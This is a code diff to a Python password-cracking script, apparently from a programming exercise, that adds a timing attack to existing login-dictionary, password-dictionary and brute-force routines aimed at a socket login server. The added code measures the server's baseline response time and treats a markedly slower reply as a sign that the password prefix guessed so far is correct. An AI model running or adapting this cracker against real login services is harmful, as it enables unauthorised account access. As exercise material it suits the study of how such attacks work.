@@ -4,11 +4,14 @@ import sys
 import itertools
 import string
 import json
+from datetime import timedelta
+from datetime import datetime
 
 found_password = None
 found_substring = None
 found_login = None
 blocked = False
+server_response_time = timedelta(seconds=1)
 
 
 def brute_force_password():
@@ -93,6 +96,24 @@ def brute_force_password_substrings():
     return found_password
 
 
+def time_password_response():
+    global server_response_time
+    login_dict = {"login": found_login, "password": "ctj4tj4q034QI"}
+    login_json = json.dumps(login_dict, indent=4)
+
+    response_time = timedelta(seconds=0)
+
+    for _i in range(100):
+        client_socket.send(login_json.encode())
+        start = datetime.now()
+        response = json.loads(client_socket.recv(1024).decode())
+        difference = datetime.now() - start
+        if difference > response_time:
+            response_time = difference
+
+    server_response_time = response_time
+
+
 def try_password(password):
     global found_login, found_password, found_substring, blocked, client_socket
 
@@ -100,7 +121,9 @@ def try_password(password):
     login_json = json.dumps(login_dict, indent=4)
 
     client_socket.send(login_json.encode())
+    start = datetime.now()
     response = json.loads(client_socket.recv(1024).decode())
+    difference = datetime.now() - start
 
     if response["result"] == "Connection success!":
         found_password = password
@@ -110,6 +133,10 @@ def try_password(password):
         found_substring = password
     elif response["result"] == "Too many attempts":
         blocked = True
+    else:
+        if difference > 10 * server_response_time:
+            # print(difference.microseconds)
+            found_substring = password
 
     return found_password
 
@@ -168,10 +195,12 @@ else:
             if not (found_password or blocked):
                 found_login = try_login_dictionary(".\\hacking\\logins.txt")
                 if found_login:
+                    time_password_response()
                     found_password = try_password_dictionary(".\\hacking\\passwords.txt")
                     if not (found_password or blocked):
                         found_password = brute_force_password_substrings()
                     if not (found_password or blocked):
+                        # print("forcing...")
                         found_password = brute_force_password()
 
         except ConnectionError:
